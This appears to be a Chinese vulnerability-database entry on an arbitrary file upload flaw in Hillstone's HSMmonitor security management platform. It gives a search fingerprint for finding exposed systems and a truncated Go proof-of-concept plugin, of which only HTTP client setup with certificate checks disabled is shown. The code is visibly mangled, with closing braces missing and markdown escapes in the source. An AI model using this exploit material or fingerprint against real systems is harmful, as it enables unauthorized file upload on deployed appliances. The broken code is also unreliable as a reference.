# 山石网科安全管理平台HSMmonitor存在任意文件上传漏洞

- **系统**：山石网科安全管理平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="login\_hsm-all.css"`

**请求体 / payload**
```
package plugins
import (
"bytes"
"crypto/tls"
"fmt"
"goplugins/poccheck"
"io"
"mime/multipart"
"net/http"
"net/url"
"os"
"strings"
"time"
)
// 这儿必须填POC\_9823，后台程序会吧ABCD替换成自增的id
type POC\_9823 struct {
func init() {
poccheck.Regist("POC\_9823", \&POC\_9823{})
func (m \*POC\_9823) sendReq(method, target, reqdata string, headers, result map\[string]interface{}) (req \*http.Request, resp \*http.Response, err error) {
getenv := os.Getenv("model")
var client \*http.Client
if getenv == "cc" {
client = \&http.Client{
Transport: \&http.Transport{
TLSClientConfig:   \&tls.Config{InsecureSkipVerify: true, MinVersion: 10},
ForceAttemptHTTP2: true,
DisableKeepAlives: true,
Proxy: http.ProxyURL(\&url.URL{
Scheme: "http",
Host:   "127.0.0.1:8084",
}),
},
Timeout: 10 \* time.Second,
} else {
client = \&http.Client{
Transport: \&http.Transport{
TLSClientConfig:   \&tls.Config{InsecureSkipVerify: true, MinVersion: 10},
ForceAttemptHTTP2: true,
DisableKeepAlives: true,
},
Timeout: 10 \* time.Second,
// 请求方式 POST GET
switch method {
case "POST":
req, err = http.NewRequest("POST", target, bytes.NewReader(\[]byte(reqdata)))
case "GET":
if reqdata != "" {
target = fmt.Sprintf("%s?%s", target, reqdata)
req, err = http.NewRequest("GET", target, nil)
default:
if reqdata != "" {
target = fmt.Sprintf("%s?%s", target, reqdata)
req, err = http.NewRequest("GET", target, nil)
if err != nil {
return nil, nil, err
// header
for k, v := range headers {
if k == "Cookie" {
cookie := \&http.Cookie{}
if cookieMap,…（脚本共 6694 字，完整版见原文）
```
- **预期**：200　|　—